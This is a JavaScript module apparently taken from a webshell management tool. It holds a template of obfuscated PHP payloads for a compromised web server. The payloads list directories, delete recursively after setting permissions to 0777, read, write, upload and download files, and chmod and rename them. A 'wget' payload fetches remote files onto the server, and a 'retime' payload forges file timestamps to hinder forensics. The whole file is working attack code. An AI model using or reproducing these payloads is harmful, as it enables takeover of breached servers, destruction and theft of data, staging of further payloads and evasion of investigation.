/**
 * 文件管理模板
 */

module.exports = (arg1, arg2, arg3) => ({
  dir: {
    _: `$D=base64_decode(substr("#{newbase64::path}",#randomPrefix#));$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,
  },

  delete: {
    _: `function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=base64_decode(substr("#{newbase64::path}",#randomPrefix#));if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");}`,
  },

  create_file: {
    _: `echo @fwrite(fopen(base64_decode(substr("#{newbase64::path}",#randomPrefix#)),"w"),base64_decode(substr("#{newbase64::content}",#randomPrefix#)))?"1":"0";`,
  },

  read_file: {
    _: `$F=base64_decode(substr("#{newbase64::path}",#randomPrefix#));$P=@fopen($F,"r");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);`,
  },

  copy: {
    _: `$fc=base64_decode(substr("#{newbase64::path}",#randomPrefix#));$fp=base64_decode(substr("#{newbase64::target}",#randomPrefix#));function xcopy($src,$dest){if(is_file($src)){if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");`,
  },

  download_file: {
    _: `$F=base64_decode(substr("#{newbase64::path}",#randomPrefix#));$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");}`,
  },

  upload_file: {
    _: `$f=base64_decode(substr("#{newbase64::path}",#randomPrefix#));
    $c="#{buffer::content}";
    $c=str_replace("\\r","",$c);
    $c=str_replace("\\n","",$c);
    $buf="";
    for($i=0;$i<strlen($c);$i+=2)
      $buf.=urldecode("%".substr($c,$i,2));
    echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");`.replace(/\n\s+/g, ''),
  },

  rename: {
    _: `
    $src=base64_decode(substr("#{newbase64::path}",#randomPrefix#));
    $dst=base64_decode(substr("#{newbase64::name}",#randomPrefix#));
    echo(rename($src,$dst)?"1":"0");`.replace(/\n\s+/g, ''),
  },

  retime: {
    _: `
    $FN=base64_decode(substr("#{newbase64::path}",#randomPrefix#));
    $TM=strtotime(base64_decode(substr("#{newbase64::time}", #randomPrefix#)));
    if(file_exists($FN)){
      echo(@touch($FN,$TM,$TM)?"1":"0");
    }else{
      echo("0");
    };`.replace(/\n\s+/g, ''),
  },

  chmod: {
    _: `
    $FN=base64_decode(substr("#{newbase64::path}",#randomPrefix#));
    $mode=base64_decode(substr("#{newbase64::mode}",#randomPrefix#));
    echo(chmod($FN,octdec($mode))?"1":"0");`.replace(/\n\s+/g, ''),
  },

  mkdir: {
    _: `$f=base64_decode(substr("#{newbase64::path}",#randomPrefix#));echo(mkdir($f)?"1":"0");`,
  },

  wget: {
    _: `$fR=base64_decode(substr("#{newbase64::url}",#randomPrefix#));
    $fL=base64_decode(substr("#{newbase64::path}",#randomPrefix#));
    $F=@fopen($fR,chr(114));
    $L=@fopen($fL,chr(119));
    if($F && $L){
      while(!feof($F))
        @fwrite($L,@fgetc($F));
      @fclose($F);
      @fclose($L);
      echo("1");
    }else{
      echo("0");
    };`.replace(/\n\s+/g, ''),
  },

  filehash: {
    _: `$f=base64_decode("#{base64::path}");
    echo("MD5\t".md5_file($f)."\n");
    echo("SHA1\t".sha1_file($f)."\n");
    `.replace(/\n\s+/g, ''),
  },
})